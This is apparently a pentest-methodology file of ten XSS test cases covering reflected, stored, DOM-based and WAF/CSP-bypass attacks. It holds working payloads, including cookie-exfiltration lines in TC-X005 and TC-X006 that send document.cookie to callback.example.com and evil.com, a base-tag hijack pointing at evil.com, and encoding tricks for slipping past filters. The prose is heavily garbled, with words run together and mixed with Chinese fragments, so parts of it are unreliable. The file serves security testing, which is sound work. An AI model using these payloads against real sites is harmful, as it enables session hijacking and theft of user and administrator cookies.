# XSS Test Cases

> This file is a companion to `SKILL.md`, containing structured XSS test cases organized by category.

---

## A. XSS Detection

### TC-X001 | Basic XSS Detection -- Script Tag Injection
- **Severity**: HIGH
- **Prerequisites**: Objective Web applicationexistscan Test inputpoint (URL parameter、Search框、formField)；browsetoolalready open DevTools Console panel。
- **Test Steps**:
 1. inObjectiveinputpointininjection `<script>alert(1)</script>`。
 2. commitrequestandObserveresponsepage。
 3. Check DevTools Console iswhetheroutputnowpopuporerror。
 4. Use Burp Suite Repeater viewresponse HTML，Confirminputiswhetherbyoriginalsampleembed。
- **Expected Results**: such as resultinputnot throughencodingdirectoutputnowinresponse HTML inandbrowsetoolExecute `alert(1)`，thenConfirmexists Reflected XSS vulnerability。such as result `<script>` byfilterbutinput仍outputnowinresponsein，continuecontinueUseeventhandlingtoolalternativesolution (TC-X002)。
- **Reference**: payloads.md §1 (XSS detectpayload)

### TC-X002 | Event Handler Alternative Detection
- **Severity**: HIGH
- **Prerequisites**: basic detect (TC-X001) Confirm `<script>` tagbyfilterorstrip，butinput仍anti映inresponse HTML in。
- **Test Steps**:
 1. 依timeinjectionwithbeloweventhandlingtoolpayload:
 - `<img src=x onerror=alert(1)>`
 - `<svg onload=alert(1)>`
 - `<input onfocus=alert(1) autofocus>`
 - `<details open ontoggle=alert(1)>`
 2. eachtimecommitafterObserveresponsepageiswhetherTriggerpopup。
 3. Record哪sometagbyfilter、哪someeventhandlingtoolcan use。
- **Expected Results**: at leastaeventhandlingtoolpayloadsuccessTrigger `alert(1)`，Confirm XSS vulnerabilityexistsandcan throughtag/eventalternativebypassfilter。
- **Reference**: payloads.md §1 (XSS detectpayload), §5 (eventhandlingtoolalternative)

---

## B. Reflected XSS

### TC-X003 | HTML Context Reflected XSS
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationexists URL parameterechosuccesscan (Search框、errormessage、redirect)；Confirminputanti映in HTML tagofinterval (nonAttributeValueor JS onbelowtext)。
- **Test Steps**:
 1. Identifyechouserinput parameter (such as `?q=`、`?name=`、`?error=`)。
 2. injectionbasic payload: `<script>alert(document.domain)</script>`。
 3. if `<script>` byfilter，切换to: `<img src=x onerror=alert(document.domain)>`。
 4. Verify Cookie can accessity: `<img src=x onerror=alert(document.cookie)>`。
 5. Use Burp Suite Comparerequestandresponse，Confirminput encodingstatus。
- **Expected Results**: successinaffected害erbrowsetoolonbelowtextinExecutearbitrary JavaScript，can access `document.cookie` and `document.domain`。attackneedinduceaffected害erpoint击special制link。
- **Reference**: payloads.md §2 (Reflected XSS)

### TC-X004 | Attribute Value Context Escape
- **Severity**: CRITICAL
- **Prerequisites**: throughresponseAnalyzeConfirmuserinput落in HTML AttributeValueinternal (such as `<input value="USER_INPUT">`)。
- **Test Steps**:
 1. injectiondouble quoteclosureAttribute: `" onmouseover=alert(1) "`。
 2. such as resultdouble quotebyencoding，Attemptsingle quote: `' onfocus=alert(1) autofocus x='`。
 3. Attempt JavaScript onbelowtextescape (ifinputin `<script>` taginner): `';alert(1);//`。
 4. VerifyConstruct AttributeiswhetherbybrowsetoolsolveanalysisExecute。
- **Expected Results**: successescapeAttributeValueonbelowtext，injectionnew eventhandlingtoolAttributeandbybrowsetoolExecute。
- **Reference**: payloads.md §2 (Reflected XSS)

---

## C. Stored XSS

### TC-X005 | User Input Field Stored XSS
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationexistsuserinputpersistencesuccesscan (评theory、user昵称、personal简介、messagesystem)；havehasnormaluseraccount。
- **Test Steps**:
 1. inuser昵称Fieldinjection: `<img src=x onerror=alert(document.cookie)>`。
 2. in评theoryFieldinjection: `<svg onload=fetch('https://callback.example.com?c='+document.cookie)>`。
 3. uploadfile，filenamesetas: `"><svg onload=alert(1)>.png`。
 4. Use另auseraccountaccesscontainson述input page。
 5. ObserveNo.二userbrowsetooliswhetherTrigger maliciousscript。
- **Expected Results**: maliciouspayloadbyserviceendpersistencestorage，any accessthepage userbrowsetoolallwillExecuteinjection script。impactscope远largeat Reflected XSS，noneedinducepoint击special制link。
- **Reference**: payloads.md §3 (Stored XSS)

### TC-X006 | HTTP Header Stored XSS (Admin Panel Reflection)
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationafter台managementsystemwillRecordandecho HTTP Header information (User-Agent、Referer)；canpush断after台managementpanel exists。
- **Test Steps**:
 1. Use Burp Suite interceptrequest，modify User-Agent as: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`。
 2. modify Referer Header as: `<img src=x onerror=fetch('https://callback.example.com?c='+document.cookie)>`。
 3. Useadministratoraccountloginafter台，viewlog/Statisticspage。
 4. ObserveadministratorbrowsetooliswhetherTrigger maliciousscript。
- **Expected Results**: administratorinafter台viewlogwhen Trigger XSS，attackercan stealadministrator Session Cookie。此classvulnerabilityoftenbyignore，becauseasTestertypically看nottoafter台echo。
- **Reference**: payloads.md §3 (Stored XSS), §11 (blindhit XSS)

---

## D. DOM-based XSS

### TC-X007 | innerHTML DOM XSS
- **Severity**: CRITICAL
- **Prerequisites**: throughsourcecodeauditor黑盒TestDiscoverfrontendcodeUse `innerHTML`、`outerHTML` or `document.write` writefrom URL data。
- **Test Steps**:
 1. auditfrontend JavaScript sourcecode，locateUse `innerHTML` codepath。
 2. Identifydatasource (`location.hash`、`location.search`、`document.referrer`)。
 3. Construct Payload: `https://target.com/page#<img src=x onerror=alert(1)>`。
 4. inbrowsetoolinaccessConstruct URL，Observeiswhetherpopup。
 5. Use DevTools Elements panelCheck DOM sectionpointiswhetherbyinjection。
- **Expected Results**: from URL malicious HTML bydirectwrite DOM andbybrowsetoolsolveanalysisExecute，noneedserviceendparameterand。Payload notwilloutputnowinserviceendlogin，increase Detectdifficultdegree。
- **Reference**: payloads.md §4 (DOM-based XSS)

### TC-X008 | jQuery Selector DOM XSS
- **Severity**: HIGH
- **Prerequisites**: ObjectiveapplicationUse jQuery library (specialotheris 3.5.0 ofbefore version)，existswillusercan 控datatransmit给 `$().html()` codepath。
- **Test Steps**:
 1. Confirm jQuery versionnumber (DevTools Console input `$.fn.jquery`)。
 2. such as resultversion < 3.5.0，Test CVE-2020-11022/23 relatedexploit。
 3. locateUse `$().html()` or `$()` selecttoolinjection codepath。
 4. Construct Payload: `https://target.com/page#<img src/x onerror=alert(1)>`。
 5. Verify jQuery iswhetherwill hash Valuetransmit给 `.html()` method。
- **Expected Results**: exploit jQuery HTML solveanalysisspecialityinclientExecuteinjectionscript。oldversion jQuery `jQuery.htmlPrefilter` willwillfromclosuretagtransformas开闭tagfor，can byexploitbypasssomesomefilter。
- **Reference**: payloads.md §4 (DOM-based XSS)

---

## E. WAF / CSP Bypass

### TC-X009 | WAF Rule Bypass
- **Severity**: HIGH
- **Prerequisites**: basic XSS Payload byConfirmcan injectionbutby WAF intercept (HTTP 403 responseor Payload bystrip)；already Identify XSS vulnerabilitypoint。
- **Test Steps**:
 1. 依timeTestwithbelowbypasstechnique:
 - mixed case: `<ScRiPt>alert(1)</ScRiPt>`
 - HTML Entity encoding: `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`
 - Unicode encoding: `<script>\u0061\u006c\u0065\u0072\u0074(1)</script>`
 - stringconcatenate: `<script>window['al'+'ert'](1)</script>`
 - 换row/制tablecharacter干扰: `<svg/onload\n=\nalert(1)>`
 - 空byteinjection: `<scr%00ipt>alert(1)</script>`
 2. foreachkindtechniqueRecord WAF response (through/intercept/strip)。
 3. groupcombinemultiplekindbypasstechniqueTest (such as encoding + mixed case)。
- **Expected Results**: at leastakindbypasstechniquesuccess穿over WAF，maliciousscriptinbrowsetoolinExecute。Recordeffective bypassgroupcombineused forfollow-upvulnerability exploitation。
- **Reference**: payloads.md §6 (encoding bypass), §7 (WAF bypasstechnique)

### TC-X010 | CSP Policy Bypass
- **Severity**: HIGH
- **Prerequisites**: ObjectiveapplicationDeploy Content Security Policy；already Confirmexists XSS injection pointbutscriptExecuteby CSP block。
- **Test Steps**:
 1. Check CSP Header or meta tag，AnalyzepolicyConfigure:
 - iswhethercontains `unsafe-inline` or `unsafe-eval`
 - `script-src` iswhethercontainslenient domain namewhitelist
 - iswhetherhascan exploit JSONP endpoint
 2. based onpolicydefectselectbypassmethod:
 - exploit JSONP endpoint: `<script src="https://allowed.com/jsonp?callback=alert(1)">`
 - exploit base taghijack: `<base href="https://evil.com/">`
 - exploit `unsafe-eval`: `<script>eval("alert(1)")</script>`
 - exploit object tag: `<object data="data:text/html,<script>alert(1)</script>">`
 3. Use `report-uri` or `Content-Security-Policy-Report-Only` collect CSP report。
- **Expected Results**: successexploit CSP ConfiguredefectbypassscriptExecutelimitation。i.e.makenomethodbypass CSP，alsocan report CSP Configuredefectworkasinetc.riskDiscover。
- **Reference**: payloads.md §9 (CSP bypasstechnique)

---

## Statistics

| Category | TestCases | ID Range |
|------|-----------|---------|
| A. XSS detect | 2 | TC-X001 - TC-X002 |
| B. Reflected XSS | 2 | TC-X003 - TC-X004 |
| C. Stored XSS | 2 | TC-X005 - TC-X006 |
| D. DOM XSS | 2 | TC-X007 - TC-X008 |
| E. WAF/CSP Bypass | 2 | TC-X009 - TC-X010 |
| **Total** | **10** | **TC-X001 - TC-X010** |

### Severity Distribution

| Severity | Count | Testuseexample |
|---------|------|---------|
| CRITICAL | 5 | TC-X003, TC-X004, TC-X005, TC-X006, TC-X007 |
| HIGH | 5 | TC-X001, TC-X002, TC-X008, TC-X009, TC-X010 |
| MEDIUM | 0 | - |
| LOW | 0 | - |
